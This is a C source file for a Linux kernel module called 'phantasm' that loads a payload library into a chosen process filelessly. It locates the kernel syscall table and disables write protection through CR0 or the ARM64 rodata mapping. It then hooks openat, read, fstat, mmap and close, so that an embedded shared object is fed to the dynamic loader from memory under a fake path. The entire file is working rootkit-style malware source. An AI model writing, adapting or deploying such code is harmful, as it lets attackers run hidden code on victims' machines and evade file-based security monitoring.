#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/string.h>
#include <linux/mman.h>
#include "payload.h"
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "phantasm.h"
int phantom_fd=0;
size_t phantom_path_len;
pid_t target_pid=0;
int payload_cursor=0;
size_t payload_size=0;
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif
static unsigned long *__sys_call_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_openat;
	static t_syscall orig_read;
	static t_syscall orig_fstat;
	static t_syscall orig_mmap;
	static t_syscall orig_close;
	
#else
	typedef asmlinkage int (*orig_openat_t)(int dirfd, const char *pathname, int flags);
	typedef asmlinkage int (*orig_read_t)(unsigned int fd,const char *buf,size_t count);
	typedef asmlinkage int (*orig_fstat_t)(int fd, struct stat *statbuf);
	typedef asmlinkage void* (*orig_mmap_t)(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset);
	typedef asmlinkage int (*orig_close_t)(int fd);
	orig_openat_t orig_openat;
	orig_read_t orig_read;
	orig_fstat_t orig_fstat;
	orig_mmap_t orig_mmap;
	orig_close_t orig_close;

#endif

unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
#else
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
#endif
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_openat(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	const char* pathname = (const char*) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	const char* pathname = (const char*) pt_regs->regs[1];
#endif
#else
asmlinkage int
hacked_openat(int dirfd, const char *pathname, int flags)
{
#endif
	char local_path[64];
	
	int match_flag=0;
	if(!strcmp(current->comm,HOST_PROCESS)){
		strncpy_from_user(local_path,pathname,sizeof(local_path));
			if(!strncmp(local_path,PHANTOM_PATH,phantom_path_len)){
				#ifdef DEBUG
					printk(KERN_DEBUG "PHANTASM openat string:%s %i (%s) \n",local_path,current->pid, current->comm);
				#endif
				target_pid=current->pid;
				match_flag=1;
				phantom_fd=PHANTOM_FD;
				return phantom_fd;
		}
	}
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			int res=orig_openat(pt_regs);
#else
			int res=orig_openat(int dirfd, const char *pathname, int flags);
#endif
	if(match_flag)phantom_fd=res;
	return res;
	
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_read(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	unsigned int fd=(unsigned int)pt_regs->di;
	const char *buf=(const char*) pt_regs->si;
	size_t count=(size_t )pt_regs->dx;
#elif IS_ENABLED(CONFIG_ARM64)
	unsigned int fd=(unsigned int)pt_regs->regs[0];
	const char *buf=(const char*) pt_regs->regs[1];
	size_t count=(size_t )pt_regs->regs[2];
#endif
#else
asmlinkage int
hacked_read(unsigned int fd,const char *buf,size_t count)
{
#endif
	if((!strcmp(current->comm,HOST_PROCESS))&&fd==phantom_fd&&current->pid==target_pid){
		#ifdef DEBUG
			printk(KERN_DEBUG "PHANTASM read %i %llx (%s) \n",current->pid,*(long long*)phantasm_so, current->comm);
		#endif
		  
		copy_to_user(buf,phantasm_so,count);// PROVIDING ld.so WITH ELF HEADER OF OUR PAYLOAD
		return count;
	}
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_read(pt_regs);
#else
			return orig_read(unsigned int fd,const char *buf,size_t count);
#endif
	
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_fstat(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd=(int)pt_regs->di;
	struct stat *statbuf=(struct stat *) pt_regs->si;

#elif IS_ENABLED(CONFIG_ARM64)
	int fd=(int)pt_regs->regs[0];
	struct stat *statbuf=(struct stat *) pt_regs->regs[1];

#endif
#else
asmlinkage int
hacked_fstat(int fd, struct stat *statbuf)
{
#endif
	if((!strcmp(current->comm,HOST_PROCESS))&&fd==phantom_fd&&current->pid==target_pid){
		#ifdef DEBUG
			printk(KERN_DEBUG "PHANTASM fstat %i (%s) \n",current->pid, current->comm);
		#endif
		ino_t phantom_st_ino=PHANTOM_ST_INO;
		mode_t phantom_st_mode=S_IFREG|0644;
		off_t phantom_st_size=sizeof(phantasm_so);
		copy_to_user(&statbuf->st_ino,&phantom_st_ino,sizeof(ino_t));  
		copy_to_user(&statbuf->st_mode,&phantom_st_mode,sizeof(mode_t));
		copy_to_user(&statbuf->st_size,&phantom_st_size,sizeof(off_t));
		return 0;
	}
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_fstat(pt_regs);
#else
			return orig_fstat(int fd, struct stat *statbuf);
#endif
	
}


#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage void*
hacked_mmap(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)

	void *addr=(void *)pt_regs->di;
	size_t length=(size_t )pt_regs->si;
	int prot=(int )pt_regs->dx;
	int flags=(int)pt_regs->r10;
	int fd=(int)pt_regs->r8;
	off_t offset=(off_t )pt_regs->r9;

#elif IS_ENABLED(CONFIG_ARM64)
	void *addr=(void *)pt_regs->regs[0];
	size_t length=(size_t )pt_regs->regs[1];
	int prot=(int )pt_regs->regs[2];
	int flags=(int)pt_regs->regs[3];
	int fd=(int)pt_regs->regs[4];
	off_t offset=(off_t )pt_regs->regs[5];

#endif
#else
asmlinkage void*
hacked_mmap(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset)
{
#endif
	if((!strcmp(current->comm,HOST_PROCESS))&&fd==phantom_fd&&current->pid==target_pid){
		#ifdef DEBUG
			printk(KERN_DEBUG "PHANTASM mmap %i (%s) \n",current->pid, current->comm);
		#endif
		void* phantasm_limb = vm_mmap(0LL, addr, length, prot | PROT_WRITE, flags | MAP_ANONYMOUS, offset);
		if( phantasm_limb<0) return phantasm_limb; // vm_mmap failure
		int remaining_body_len=payload_size-offset;
		if(length<remaining_body_len){
			copy_to_user(phantasm_limb,&phantasm_so[offset],length);
			return phantasm_limb;
		}else if(remaining_body_len>0){
			copy_to_user(phantasm_limb,&phantasm_so[offset],remaining_body_len);
			return phantasm_limb;
		}else{
			return (void*)-1;
		}

	}
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_mmap(pt_regs);
#else
			return orig_mmap(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset);
#endif
	
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
hacked_close(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd=(int)pt_regs->di;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd=(int)pt_regs->regs[0];
#endif
#else
asmlinkage int
hacked_close(int fd)
{
#endif
	if((!strcmp(current->comm,HOST_PROCESS))&&fd==phantom_fd&&current->pid==target_pid){
		#ifdef DEBUG
			printk(KERN_DEBUG "PHANTASM close %i (%s) \n",current->pid, current->comm);
		#endif
		phantom_fd=0;
		target_pid=0;
		return 0;
	}
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
			return orig_close(pt_regs);
#else
			return orig_close(int fd);
#endif
	
}


#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

static inline void
protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL_RO);

#endif
}

static inline void
unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL);
#endif
}

static int __init
phantasm_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;
	phantom_path_len=strlen(PHANTOM_PATH);
	payload_size=sizeof(phantasm_so);
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif


#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	orig_openat = (t_syscall)__sys_call_table[__NR_openat];
	orig_read = (t_syscall)__sys_call_table[__NR_read];
	orig_fstat = (t_syscall)__sys_call_table[__NR_fstat];
	orig_mmap = (t_syscall)__sys_call_table[__NR_mmap];
	orig_close = (t_syscall)__sys_call_table[__NR_close];

#else
	orig_openat = (orig_openat_t)__sys_call_table[__NR_openat];
	orig_read = (orig_read_t)__sys_call_table[__NR_read];
	orig_fstat = (orig_fstat_t)__sys_call_table[__NR_fstat];
	orig_mmap = (orig_mmap_t)__sys_call_table[__NR_mmap];
	orig_close = (orig_close_t)__sys_call_table[__NR_close];

#endif

	unprotect_memory();

	__sys_call_table[__NR_openat] = (unsigned long) hacked_openat;
	__sys_call_table[__NR_read] = (unsigned long) hacked_read;
	__sys_call_table[__NR_fstat] = (unsigned long) hacked_fstat;
	__sys_call_table[__NR_mmap] = (unsigned long) hacked_mmap;
	__sys_call_table[__NR_close] = (unsigned long) hacked_close;


	protect_memory();

	return 0;
}

static void __exit
phantasm_cleanup(void)
{
	unprotect_memory();

	__sys_call_table[__NR_openat] = (unsigned long) orig_openat;
	__sys_call_table[__NR_read] = (unsigned long) orig_read;
	__sys_call_table[__NR_fstat] = (unsigned long) orig_fstat;
	__sys_call_table[__NR_mmap] = (unsigned long) orig_mmap;
	__sys_call_table[__NR_close] = (unsigned long) orig_close;



	protect_memory();
}

module_init(phantasm_init);
module_exit(phantasm_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("RevelatoryHungover");
MODULE_DESCRIPTION("LKM to filelessly load a library");
